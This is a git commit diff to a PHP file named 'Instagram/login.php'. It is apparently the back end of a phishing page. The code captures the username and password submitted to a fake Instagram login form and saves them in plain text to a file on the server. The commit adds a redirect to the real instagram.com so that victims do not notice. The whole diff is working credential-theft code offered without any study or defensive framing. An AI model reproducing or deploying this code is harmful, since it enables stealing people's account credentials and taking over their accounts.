e177b0098d96f19f25585c11a6408ded8632ee4d
Matheus Fontanetti Martins <matheusfontanettimartins@gmail.com>
2023-04-05 10:52:50 -0300

    changes

--- Instagram/login.php
+++ Instagram/login.php
@@ -3,8 +3,10 @@
     $password = $_POST['password'];
 
     // cria arquivo no servidor
-    $arquivo = fopen('/tmp/instagram/account'. username .'.txt','w');
-    $texto = 'usuario: '. $username .'\n senha: '. $password; 
+    $arquivo = fopen('/tmp/instagram/account_'. $username .'.txt','w');
+    $texto = "Usuario: ". $username ."\r\nSenha: ". $password ."\r\n";
     fwrite($arquivo, $texto);
     fclose($arquivo);
+
+    header("location: https://instagram.com");
 ?>
